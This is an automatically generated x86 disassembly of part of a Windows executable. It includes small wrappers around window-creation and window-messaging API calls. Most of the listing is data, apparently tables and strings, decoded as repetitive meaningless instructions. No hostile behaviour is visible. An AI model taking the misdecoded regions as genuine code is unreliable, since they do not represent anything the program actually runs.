add [ ebx + 0x6025ffc0 ] cl
xchg edx eax
inc esi
add [ ebx + 0x5c25ffc0 ] cl
xchg edx eax
inc esi
add [ ebx + 0x5c25ffc0 ] cl
xchg edx eax
inc esi
add [ ebx + 0x5825ffc0 ] cl
xchg edx eax
inc esi
add [ ebx + 0x5425ffc0 ] cl
xchg edx eax
inc esi
add [ ebx + 0x5025ffc0 ] cl
xchg edx eax
inc esi
add [ ebx + 0x4c25ffc0 ] cl
xchg edx eax
inc esi
add [ ebx + 0x4825ffc0 ] cl
xchg edx eax
inc esi
add [ ebx + 0x4425ffc0 ] cl
xchg edx eax
inc esi
add [ ebx + 0x4025ffc0 ] cl
xchg edx eax
inc esi
add [ ebx + 0x3c25ffc0 ] cl
xchg edx eax
inc esi
add [ ebx + 0x3825ffc0 ] cl
xchg edx eax
inc esi
add [ ebx + 0x3425ffc0 ] cl
xchg edx eax
inc esi
add [ ebx + 0x3025ffc0 ] cl
xchg edx eax
inc esi
add [ ebx + 0x2c25ffc0 ] cl
xchg edx eax
inc esi
add [ ebx + 0x2825ffc0 ] cl
xchg edx eax
inc esi
add [ ebx + 0x2425ffc0 ] cl
xchg edx eax
inc esi
add [ ebx + 0x2025ffc0 ] cl
xchg edx eax
inc esi
add [ ebx + 0x1c25ffc0 ] cl
xchg edx eax
inc esi
add [ ebx + 0x1825ffc0 ] cl
xchg edx eax
inc esi
add [ ebx + 0x1425ffc0 ] cl
xchg edx eax
inc esi
add [ ebx + 0x1025ffc0 ] cl
xchg edx eax
inc esi
add [ ebx + 0x3825ffc0 ] cl
xchg ebx eax
inc esi
add [ ebx + 0x3425ffc0 ] cl
xchg ebx eax
inc esi
add [ ebx + 0x3025ffc0 ] cl
xchg ebx eax
inc esi
add [ ebx + 0x4425ffc0 ] cl
xchg esp eax
inc esi
add [ ebx + 0x4025ffc0 ] cl
xchg esp eax
inc esi
add [ ebx + 0x3c25ffc0 ] cl
xchg esp eax
inc esi
add [ ebx + 0x3825ffc0 ] cl
xchg esp eax
inc esi
add [ ebx + 0x3425ffc0 ] cl
xchg esp eax
inc esi
add [ ebx + 0x3025ffc0 ] cl
xchg esp eax
inc esi
add [ ebx + 0x2c25ffc0 ] cl
xchg esp eax
inc esi
add [ ebx + 0x2825ffc0 ] cl
xchg esp eax
inc esi
add [ ebx + 0x2425ffc0 ] cl
xchg esp eax
inc esi
add [ ebx + 0x2025ffc0 ] cl
xchg esp eax
inc esi
add [ ebx + 0x1c25ffc0 ] cl
xchg esp eax
inc esi
add [ ebx + 0x1825ffc0 ] cl
xchg esp eax
inc esi
add [ ebx + 0x1425ffc0 ] cl
xchg esp eax
inc esi
add [ ebx + 0x1025ffc0 ] cl
xchg esp eax
inc esi
add [ ebx + 0xc25ffc0 ] cl
xchg esp eax
inc esi
add [ ebx + 0x825ffc0 ] cl
xchg esp eax
inc esi
add [ ebx + 0x425ffc0 ] cl
xchg esp eax
inc esi
add [ ebx + 0x25ffc0 ] cl
xchg esp eax
inc esi
add [ ebx - 0x3da0040 ] cl
xchg ebx eax
inc esi
add [ ebx - 0x7da0040 ] cl
xchg ebx eax
inc esi
add [ ebx - 0xbda0040 ] cl
xchg ebx eax
inc esi
add [ ebx - 0xfda0040 ] cl
xchg ebx eax
inc esi
add [ ebx - 0x13da0040 ] cl
xchg ebx eax
inc esi
add [ ebx - 0x17da0040 ] cl
xchg ebx eax
inc esi
add [ ebx - 0x1bda0040 ] cl
xchg ebx eax
inc esi
add [ ebx - 0x1fda0040 ] cl
xchg ebx eax
inc esi
add [ ebx - 0x23da0040 ] cl
xchg ebx eax
inc esi
add [ ebx - 0x27da0040 ] cl
xchg ebx eax
inc esi
add [ ebx - 0x2bda0040 ] cl
xchg ebx eax
inc esi
add [ ebx - 0x2fda0040 ] cl
xchg ebx eax
inc esi
add [ ebx - 0x33da0040 ] cl
xchg ebx eax
inc esi
add [ ebx - 0x37da0040 ] cl
xchg ebx eax
inc esi
add [ ebx - 0x3bda0040 ] cl
xchg ebx eax
inc esi
add [ ebx - 0x3fda0040 ] cl
xchg ebx eax
inc esi
add [ ebx - 0x43da0040 ] cl
xchg ebx eax
inc esi
add [ ebx - 0x47da0040 ] cl
xchg ebx eax
inc esi
add [ ebx - 0x4bda0040 ] cl
xchg ebx eax
inc esi
add [ ebx - 0x4fda0040 ] cl
xchg ebx eax
inc esi
add [ ebx - 0x53da0040 ] cl
xchg ebx eax
inc esi
add [ ebx - 0x57da0040 ] cl
xchg ebx eax
inc esi
add [ ebx - 0x5bda0040 ] cl
xchg ebx eax
inc esi
add [ ebx - 0x5fda0040 ] cl
xchg ebx eax
inc esi
add [ ebx - 0x63da0040 ] cl
xchg ebx eax
inc esi
add [ ebx - 0x67da0040 ] cl
xchg ebx eax
inc esi
add [ ebx - 0x6bda0040 ] cl
xchg ebx eax
inc esi
add [ ebx - 0x6fda0040 ] cl
xchg ebx eax
inc esi
add [ ebx - 0x73da0040 ] cl
xchg ebx eax
inc esi
add [ ebx - 0x77da0040 ] cl
xchg ebx eax
inc esi
add [ ebx - 0x7bda0040 ] cl
xchg ebx eax
inc esi
add [ ebx - 0x7fda0040 ] cl
xchg ebx eax
inc esi
add [ ebx + 0x7c25ffc0 ] cl
xchg ebx eax
inc esi
add [ ebx + 0x7825ffc0 ] cl
xchg ebx eax
inc esi
add [ ebx + 0x7425ffc0 ] cl
xchg ebx eax
inc esi
add [ ebx + 0x7025ffc0 ] cl
xchg ebx eax
inc esi
add [ ebx + 0x6c25ffc0 ] cl
xchg ebx eax
inc esi
add [ ebx + 0x6825ffc0 ] cl
xchg ebx eax
inc esi
add [ ebx + 0x6425ffc0 ] cl
xchg ebx eax
inc esi
add [ ebx + 0x6025ffc0 ] cl
xchg ebx eax
inc esi
add [ ebx + 0x5c25ffc0 ] cl
xchg ebx eax
inc esi
add [ ebx + 0x5825ffc0 ] cl
xchg ebx eax
inc esi
add [ ebx + 0x5425ffc0 ] cl
xchg ebx eax
inc esi
add [ ebx + 0x5025ffc0 ] cl
xchg ebx eax
inc esi
add [ ebx + 0x4c25ffc0 ] cl
xchg ebx eax
inc esi
add [ ebx + 0x4825ffc0 ] cl
xchg ebx eax
inc esi
add [ ebx + 0x4425ffc0 ] cl
xchg ebx eax
inc esi
add [ ebx + 0x4025ffc0 ] cl
xchg ebx eax
inc esi
add [ ebx - 0x2fda0040 ] cl
xchg esi eax
inc esi
add [ ebx - 0x33da0040 ] cl
xchg esi eax
inc esi
add [ ebx - 0x3fda0040 ] cl
xchg esi eax
inc esi
add [ ebx - 0x4bda0040 ] cl
xchg esi eax
inc esi
add [ ebx - 0x4fda0040 ] cl
xchg esi eax
inc esi
add [ ebx - 0x53da0040 ] cl
xchg esi eax
inc esi
add [ ebx - 0x57da0040 ] cl
xchg esi eax
inc esi
add [ ebx - 0x43da0040 ] cl
xchg esi eax
inc esi
add [ ebx - 0x47da0040 ] cl
xchg esi eax
inc esi
add [ ebx - 0x37da0040 ] cl
xchg esi eax
inc esi
add [ ebx - 0x3bda0040 ] cl
xchg esi eax
inc esi
add [ ebx - 0x5bda0040 ] cl
xchg esi eax
inc esi
add [ ebx - 0x5fda0040 ] cl
xchg esi eax
inc esi
add [ ebx - 0x63da0040 ] cl
xchg esi eax
inc esi
add [ ebx - 0x67da0040 ] cl
xchg esi eax
inc esi
add [ ebx - 0x6bda0040 ] cl
xchg esi eax
inc esi
add [ ebx - 0x6fda0040 ] cl
xchg esi eax
inc esi
add [ ebx - 0x73da0040 ] cl
xchg esi eax
inc esi
add [ ebx - 0x77da0040 ] cl
xchg esi eax
inc esi
add [ ebx - 0x7bda0040 ] cl
xchg esi eax
inc esi
add [ ebx - 0x7fda0040 ] cl
xchg esi eax
inc esi
add [ ebx + 0x7c25ffc0 ] cl
xchg esi eax
inc esi
add [ ebx + 0x7825ffc0 ] cl
xchg esi eax
inc esi
add [ ebx + 0x7425ffc0 ] cl
xchg esi eax
inc esi
add [ ebx + 0x7025ffc0 ] cl
xchg esi eax
inc esi
add [ ebx + 0x6c25ffc0 ] cl
xchg esi eax
inc esi
add [ ebx + 0x6825ffc0 ] cl
xchg esi eax
inc esi
add [ ebx + 0x6425ffc0 ] cl
xchg esi eax
inc esi
add [ ebx + 0x6025ffc0 ] cl
xchg esi eax
inc esi
add [ ebx + 0x5c25ffc0 ] cl
xchg esi eax
inc esi
add [ ebx + 0x5825ffc0 ] cl
xchg esi eax
inc esi
add [ ebx + 0x5425ffc0 ] cl
xchg esi eax
inc esi
add [ ebx + 0x5025ffc0 ] cl
xchg esi eax
inc esi
add [ ebx + 0x4c25ffc0 ] cl
xchg esi eax
inc esi
add [ ebx + 0x4825ffc0 ] cl
xchg esi eax
inc esi
add [ ebx + 0x4425ffc0 ] cl
xchg esi eax
inc esi
add [ ebx + 0x4025ffc0 ] cl
xchg esi eax
inc esi
add [ ebx + 0x3c25ffc0 ] cl
xchg esi eax
inc esi
add [ ebx + 0x3825ffc0 ] cl
xchg esi eax
inc esi
add [ ebx + 0x3425ffc0 ] cl
xchg esi eax
inc esi
add [ ebx + 0x3025ffc0 ] cl
xchg esi eax
inc esi
add [ ebx + 0x2c25ffc0 ] cl
xchg esi eax
inc esi
add [ ebx + 0x2825ffc0 ] cl
xchg esi eax
inc esi
add [ ebx + 0x2425ffc0 ] cl
xchg esi eax
inc esi
add [ ebx + 0x2025ffc0 ] cl
xchg esi eax
inc esi
add [ ebx + 0x1c25ffc0 ] cl
xchg esi eax
inc esi
add [ ebx + 0x1825ffc0 ] cl
xchg esi eax
inc esi
add [ ebx + 0x1425ffc0 ] cl
xchg esi eax
inc esi
add [ ebx + 0x1025ffc0 ] cl
xchg esi eax
inc esi
add [ ebx + 0xc25ffc0 ] cl
xchg esi eax
inc esi
add [ ebx + 0x825ffc0 ] cl
xchg esi eax
inc esi
add [ ebx + 0x425ffc0 ] cl
xchg esi eax
inc esi
add [ ebx + 0x25ffc0 ] cl
xchg esi eax
inc esi
add [ ebx - 0x3da0040 ] cl
xchg ebp eax
inc esi
add [ ebx - 0x7da0040 ] cl
xchg ebp eax
inc esi
add [ ebx - 0xbda0040 ] cl
xchg ebp eax
inc esi
add [ ebx - 0xfda0040 ] cl
xchg ebp eax
inc esi
add [ ebx - 0x13da0040 ] cl
xchg ebp eax
inc esi
add [ ebx - 0x17da0040 ] cl
xchg ebp eax
inc esi
add [ ebx - 0x1bda0040 ] cl
xchg ebp eax
inc esi
add [ ebx - 0x1fda0040 ] cl
xchg ebp eax
inc esi
add [ ebx - 0x23da0040 ] cl
xchg ebp eax
inc esi
add [ ebx - 0x27da0040 ] cl
xchg ebp eax
inc esi
add [ ebx - 0x2bda0040 ] cl
xchg ebp eax
inc esi
add [ ebx - 0x2fda0040 ] cl
xchg ebp eax
inc esi
add [ ebx - 0x33da0040 ] cl
xchg ebp eax
inc esi
add [ ebx - 0x37da0040 ] cl
xchg ebp eax
inc esi
add [ ebx - 0x3bda0040 ] cl
xchg ebp eax
inc esi
add [ ebx - 0x3fda0040 ] cl
xchg ebp eax
inc esi
add [ ebx - 0x43da0040 ] cl
xchg ebp eax
inc esi
add [ ebx - 0x47da0040 ] cl
xchg ebp eax
inc esi
add [ ebx - 0x4bda0040 ] cl
xchg ebp eax
inc esi
add [ ebx - 0x4fda0040 ] cl
xchg ebp eax
inc esi
add [ ebx - 0x53da0040 ] cl
xchg ebp eax
inc esi
add [ ebx - 0x57da0040 ] cl
xchg ebp eax
inc esi
add [ ebx - 0x5bda0040 ] cl
xchg ebp eax
inc esi
add [ ebx - 0x5fda0040 ] cl
xchg ebp eax
inc esi
add [ ebx - 0x63da0040 ] cl
xchg ebp eax
inc esi
add [ ebx - 0x67da0040 ] cl
xchg ebp eax
inc esi
add [ ebx - 0x6bda0040 ] cl
xchg ebp eax
inc esi
add [ ebx - 0x6fda0040 ] cl
xchg ebp eax
inc esi
add [ ebx - 0x73da0040 ] cl
xchg ebp eax
inc esi
add [ ebx - 0x47da0040 ] cl
xchg ebp eax
inc esi
add [ ebx - 0x77da0040 ] cl
xchg ebp eax
inc esi
add [ ebx - 0x7bda0040 ] cl
xchg ebp eax
inc esi
add [ ebx - 0x7fda0040 ] cl
xchg ebp eax
inc esi
add [ ebx + 0x7c25ffc0 ] cl
xchg ebp eax
inc esi
add [ ebx + 0x7825ffc0 ] cl
xchg ebp eax
inc esi
add [ ebx + 0x7425ffc0 ] cl
xchg ebp eax
inc esi
add [ ebx + 0x7425ffc0 ] cl
xchg ebp eax
inc esi
add [ ebx + 0x7025ffc0 ] cl
xchg ebp eax
inc esi
add [ ebx + 0x6c25ffc0 ] cl
xchg ebp eax
inc esi
add [ ebx + 0x6825ffc0 ] cl
xchg ebp eax
inc esi
add [ ebx + 0x6425ffc0 ] cl
xchg ebp eax
inc esi
add [ ebx + 0x6025ffc0 ] cl
xchg ebp eax
inc esi
add [ ebx + 0x5c25ffc0 ] cl
xchg ebp eax
inc esi
add [ ebx + 0x5825ffc0 ] cl
xchg ebp eax
inc esi
add [ ebx + 0x5425ffc0 ] cl
xchg ebp eax
inc esi
add [ ebx + 0x5025ffc0 ] cl
xchg ebp eax
inc esi
add [ ebx + 0x4c25ffc0 ] cl
xchg ebp eax
inc esi
add [ ebx + 0x4825ffc0 ] cl
xchg ebp eax
inc esi
add [ ebx + 0x4425ffc0 ] cl
xchg ebp eax
inc esi
add [ ebx + 0x4025ffc0 ] cl
xchg ebp eax
inc esi
add [ ebx + 0x3c25ffc0 ] cl
xchg ebp eax
inc esi
add [ ebx + 0x3825ffc0 ] cl
xchg ebp eax
inc esi
add [ ebx + 0x3425ffc0 ] cl
xchg ebp eax
inc esi
add [ ebx + 0x3025ffc0 ] cl
xchg ebp eax
inc esi
add [ ebx + 0x2c25ffc0 ] cl
xchg ebp eax
inc esi
add [ ebx + 0x2825ffc0 ] cl
xchg ebp eax
inc esi
add [ ebx + 0x2425ffc0 ] cl
xchg ebp eax
inc esi
add [ ebx + 0x2025ffc0 ] cl
xchg ebp eax
inc esi
add [ ebx + 0x1c25ffc0 ] cl
xchg ebp eax
inc esi
add [ ebx + 0x1825ffc0 ] cl
xchg ebp eax
inc esi
add [ ebx + 0x1425ffc0 ] cl
xchg ebp eax
inc esi
add [ ebx + 0x1025ffc0 ] cl
xchg ebp eax
inc esi
add [ ebx + 0xc25ffc0 ] cl
xchg ebp eax
inc esi
add [ ebx + 0x825ffc0 ] cl
xchg ebp eax
inc esi
add [ ebx + 0x425ffc0 ] cl
xchg ebp eax
inc esi
add [ ebx + 0x25ffc0 ] cl
xchg ebp eax
inc esi
add [ ebx - 0x3da0040 ] cl
xchg esp eax
inc esi
add [ ebx - 0x7da0040 ] cl
xchg esp eax
inc esi
add [ ebx - 0xbda0040 ] cl
xchg esp eax
inc esi
add [ ebx - 0xfda0040 ] cl
xchg esp eax
inc esi
add [ ebx - 0x13da0040 ] cl
xchg esp eax
inc esi
add [ ebx - 0x17da0040 ] cl
xchg esp eax
inc esi
add [ ebx - 0x1bda0040 ] cl
xchg esp eax
inc esi
add [ ebx - 0x1fda0040 ] cl
xchg esp eax
inc esi
add [ ebx - 0x23da0040 ] cl
xchg esp eax
inc esi
add [ ebx - 0x27da0040 ] cl
xchg esp eax
inc esi
add [ ebx - 0x2bda0040 ] cl
xchg esp eax
inc esi
add [ ebx - 0x2fda0040 ] cl
xchg esp eax
inc esi
add [ ebx - 0x33da0040 ] cl
xchg esp eax
inc esi
add [ ebx - 0x37da0040 ] cl
xchg esp eax
inc esi
add [ ebx - 0x3bda0040 ] cl
xchg esp eax
inc esi
add [ ebx - 0x3fda0040 ] cl
xchg esp eax
inc esi
add [ ebx - 0x43da0040 ] cl
xchg esp eax
inc esi
add [ ebx - 0x47da0040 ] cl
xchg esp eax
inc esi
add [ ebx - 0x4bda0040 ] cl
xchg esp eax
inc esi
add [ ebx - 0x4fda0040 ] cl
xchg esp eax
inc esi
add [ ebx - 0x53da0040 ] cl
xchg esp eax
inc esi
add [ ebx - 0x57da0040 ] cl
xchg esp eax
inc esi
add [ ebx - 0x5bda0040 ] cl
xchg esp eax
inc esi
add [ ebx - 0x5fda0040 ] cl
xchg esp eax
inc esi
add [ ebx - 0x63da0040 ] cl
xchg esp eax
inc esi
add [ ebx - 0x67da0040 ] cl
xchg esp eax
inc esi
add [ ebx - 0x6bda0040 ] cl
xchg esp eax
inc esi
add [ ebx - 0x6fda0040 ] cl
xchg esp eax
inc esi
add [ ebx - 0x73da0040 ] cl
xchg esp eax
inc esi
add [ ebx - 0x77da0040 ] cl
xchg esp eax
inc esi
add [ ebx - 0x7bda0040 ] cl
xchg esp eax
inc esi
add [ ebx - 0x7fda0040 ] cl
xchg esp eax
inc esi
add [ ebx + 0x7c25ffc0 ] cl
xchg esp eax
inc esi
add [ ebx + 0x7825ffc0 ] cl
xchg esp eax
inc esi
add [ ebx + 0x7425ffc0 ] cl
xchg esp eax
inc esi
add [ ebx + 0x7025ffc0 ] cl
xchg esp eax
inc esi
add [ ebx + 0x6c25ffc0 ] cl
xchg esp eax
inc esi
add [ ebx + 0x6825ffc0 ] cl
xchg esp eax
inc esi
add [ ebx + 0x6425ffc0 ] cl
xchg esp eax
inc esi
add [ ebx + 0x6025ffc0 ] cl
xchg esp eax
inc esi
add [ ebx + 0x5c25ffc0 ] cl
xchg esp eax
inc esi
add [ ebx + 0x5825ffc0 ] cl
xchg esp eax
inc esi
add [ ebx + 0x5425ffc0 ] cl
xchg esp eax
inc esi
add [ ebx + 0x5025ffc0 ] cl
xchg esp eax
inc esi
add [ ebx - 0x3f48f040 ] cl
movzx edx dx
shl edx 0x10
or eax edx
retn
ja EnterCriticalSection
or ch [ edi + 0x64 ]
outsd
dec eax
outsd
je r-xdata
add [ ebx + 0x2425ffc0 ] cl
xchg ebx eax
inc esi
add [ ebx + 0x2025ffc0 ] cl
xchg ebx eax
imul esi [ fs : edi + eax + 0x57 ] 0x6f646e69
je FileTimeToDosDateTime
ja r-xdata
imul esi [ edi + eax + 0x57 ] 0x6f646e69
dec ecx
outsb
popad
arpl [ ecx + ebp * 2 + 0x76 ] si
or [ gs : edi + 0x64 ] ebp
dec esi
outsd
inc ecx
arpl [ ebx + 0x65 ] sp
insb
or eax 0x6f4e646f
inc esi
outsd
arpl [ ebp + 0x73 ] si
push edx
arpl [ gs : ebx + ecx + 0x6f ] si
push edx
jae CompareStringA
imul esp [ edi + 0x68 ] 0x646f0a74
mov eax eax
nop
sbb [ esi + 0x40 ] bl
add [ esi ] al
andps xmm1 [ edi + 0x77 ]
outsb
jb r-xdata
je r-xdata
add [ ebx + 0x1825ffc0 ] cl
xchg ebx eax
inc esi
add [ ebx + 0x1425ffc0 ] cl
xchg ebx eax
mov eax eax
add esp [ ebp + ebx * 2 + 0x40 ]
add [ ebx + 0x825ffc0 ] cl
xchg edx eax
inc esi
add [ ebx + 0x425ffc0 ] cl
xchg edx eax
inc esi
add [ ebx + 0x25ffc0 ] cl
xchg edx eax
inc esi
add [ ebx + 0x2825ffc0 ] cl
xchg ebx eax
inc esi
sub_406868
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
call sub_402908
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
push esi
call CreateWindowExA
mov esi eax
mov eax ebx
call sub_4028f8
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x24
sub_4068c0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
call sub_402908
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
push esi
push 0x0
call CreateWindowExA
mov esi eax
mov eax ebx
call sub_4028f8
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x20
sub_406918
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
push r-xdata
push r-xdata
call FindWindowA
mov ebx eax
push r-xdata
call RegisterWindowMessageA
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
push r-xdata
call RegisterWindowMessageA
mov [ esi ] eax
push r-xdata
call RegisterWindowMessageA
mov [ edi ] eax
cmp [ esi ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
xor edx edx
mov [ eax ] edx
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x3
test ebx ebx
je r-xdata
push 0x0
push 0x0
mov eax [ esi ]
push eax
push ebx
call SendMessageA
mov edx [ ebp + 0xc ]
mov [ edx ] eax
jmp r-xdata
push 0x0
push 0x0
mov eax [ edi ]
push eax
push ebx
call SendMessageA
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
jmp r-xdata
cmp [ edi ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_406a0d
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_406a35
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_406a3c
retn
sub_406a48
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_406a6d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_406a74
retn
sub_406a80
xchg [ fs : esi ] al
[ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add cl dh
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add dl dh
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add bl dh
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add ah dh
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add ch dh
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add dh dh
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add bh dh
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add al bh
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add cl bh
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add dl bh
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add bl bh
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add ah bh
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add ch bh
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add dh bh
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add bh bh
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add al ah
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add cl ah
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add dl ah
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add bl ah
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add ah ah
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add ch ah
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add dh ah
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add bh ah
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add al ch
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add cl ch
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add dl ch
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add bl ch
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add ah ch
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add ch ch
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add dh ch
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add bh ch
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add al dl
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add cl dl
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add dl dl
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add bl dl
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add ah dl
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add ch dl
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add dh dl
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add bh dl
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add al bl
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add cl bl
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add dl bl
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add bl bl
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add ah bl
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add ch bl
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add dh bl
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add bh bl
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add al al
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add cl al
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add dl al
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add bl al
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add ah al
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add ch al
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add dh al
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add bh al
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add al cl
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add cl cl
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add dl cl
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add bl cl
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add ah cl
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add ch cl
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add dh cl
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add bh cl
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add [ eax + 0x640000ff ] dh
xchg [ esi ] al
mov cl 0xff
add [ eax ] al
xchg [ fs : esi ] al
mov dl 0xff
add [ eax ] al
xchg [ fs : esi ] al
mov bl 0xff
add [ eax ] al
xchg [ fs : esi ] al
mov ah 0xff
add [ eax ] al
xchg [ fs : esi ] al
mov ch 0xff
add [ eax ] al
xchg [ fs : esi ] al
mov dh 0xff
add [ eax ] al
xchg [ fs : esi ] al
mov bh 0xff
add [ eax ] al
xchg [ fs : esi ] al
mov eax 0x640000ff
xchg [ esi ] al
mov ecx 0x640000ff
xchg [ esi ] al
mov edx 0x640000ff
xchg [ esi ] al
mov ebx 0x640000ff
xchg [ esi ] al
mov esp 0x640000ff
xchg [ esi ] al
mov ebp 0x640000ff
xchg [ esi ] al
mov esi 0x640000ff
xchg [ esi ] al
mov edi 0x640000ff
xchg [ esi ] al
mov al [ 0x640000ff ]
xchg [ esi ] al
mov eax [ 0x640000ff ]
xchg [ esi ] al
mov [ 0x640000ff ] al
xchg [ esi ] al
mov [ 0x640000ff ] eax
xchg [ esi ] al
movsb [ edi ] [ esi ]
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add [ ebp + 0x640000ff ] ah
xchg [ esi ] al
cmpsb [ esi ] [ edi ]
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add [ edi + 0x640000ff ] ah
xchg [ esi ] al
test al 0xff
add [ eax ] al
xchg [ fs : esi ] al
test eax 0x640000ff
xchg [ esi ] al
stosb [ edi ]
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add [ ebx + 0x640000ff ] ch
xchg [ esi ] al
lodsb [ esi ]
inc [ eax ]
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_406d8d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_406d94
retn
sub_406db4
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cld
insd
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] cl
outsb
inc eax
add [ eax + eax ] cl
add [ eax ] al
mov al [ 0x4c004010 ]
xor eax [ eax ]
pop eax
xor eax [ eax ]
pop esp
xor eax [ eax ]
pushad
xor eax [ eax ]
push esp
xor eax [ eax ]
pushfd
xor [ eax ] al
mov eax 0xf4004030
xor [ eax ] al
push cs
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x40040 ] dl
add [ eax ] al
or [ ebp + 0x78 ] eax
arpl [ ebp + 0x70 ] sp
je r-xdata
